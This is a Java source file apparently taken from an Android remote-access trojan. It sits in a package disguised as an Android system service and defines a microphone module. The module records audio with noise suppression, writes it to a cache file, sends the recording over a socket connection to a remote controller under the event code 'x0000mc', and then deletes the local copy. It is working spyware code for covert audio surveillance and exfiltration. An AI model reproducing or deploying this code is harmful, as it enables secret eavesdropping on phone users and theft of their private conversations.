package com.android.background.services.helpers;

import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.media.audiofx.AcousticEchoCanceler;
import android.media.audiofx.AutomaticGainControl;
import android.media.audiofx.NoiseSuppressor;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.android.background.services.IOSocket;
import com.android.background.services.MainService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

public class MicRecorderManager {

    private static final int SAMPLE_RATE = 44100;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;

    private static AudioRecord audioRecord;
    private static boolean isRecording = false;
    private static Thread recordingThread;
    private static File pcmFile;

    public static void start() {
        if (ContextCompat.checkSelfPermission(MainService.getContextOfApplication(),
                android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.e("MicRecorderManager", "RECORD_AUDIO permission not granted.");
            return;
        }

        try {
            int bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
            audioRecord = new AudioRecord(
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    SAMPLE_RATE,
                    CHANNEL_CONFIG,
                    AUDIO_FORMAT,
                    bufferSize
            );

            // Enable DSP features
            int sessionId = audioRecord.getAudioSessionId();
            if (NoiseSuppressor.isAvailable()) NoiseSuppressor.create(sessionId);
            if (AutomaticGainControl.isAvailable()) AutomaticGainControl.create(sessionId);
            if (AcousticEchoCanceler.isAvailable()) AcousticEchoCanceler.create(sessionId);

            pcmFile = File.createTempFile("mic_record_", ".pcm", MainService.getContextOfApplication().getCacheDir());

            audioRecord.startRecording();
            isRecording = true;

            recordingThread = new Thread(() -> {
                try (BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(pcmFile))) {
                    byte[] buffer = new byte[bufferSize];
                    while (isRecording && audioRecord.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                        int read = audioRecord.read(buffer, 0, buffer.length);
                        if (read > 0) {
                            out.write(buffer, 0, read);
                        }
                    }
                } catch (IOException e) {
                    Log.e("MicRecorderManager", "Recording error: ", e);
                }
            });

            recordingThread.start();
            Log.i("MicRecorderManager", "Recording started...");
        } catch (Exception e) {
            Log.e("MicRecorderManager", "Failed to start recording: ", e);
        }
    }

    public static void stop() {
        try {
            isRecording = false;

            if (audioRecord != null) {
                audioRecord.stop();
                audioRecord.release();
                audioRecord = null;
            }

            if (recordingThread != null) {
                recordingThread.join();
                recordingThread = null;
            }

            if (pcmFile != null && pcmFile.exists()) {
                sendPcmFile(pcmFile);
                pcmFile.delete();
            }

            Log.i("MicRecorderManager", "Recording stopped.");
        } catch (Exception e) {
            Log.e("MicRecorderManager", "Failed to stop recording: ", e);
        }
    }

    private static void sendPcmFile(File file) {
        try {
            byte[] data = new byte[(int) file.length()];
            try (FileInputStream fis = new FileInputStream(file)) {
                fis.read(data);
            }

            JSONObject obj = new JSONObject();
            obj.put("file", true);
            obj.put("name", "recording_" + System.currentTimeMillis() + ".pcm");
            obj.put("buffer", data);

            IOSocket.getInstance().getIoSocket().emit("x0000mc", obj);
            Log.i("MicRecorderManager", "PCM file sent.");
        } catch (IOException | JSONException e) {
            Log.e("MicRecorderManager", "Error sending PCM file: ", e);
        }
    }
}
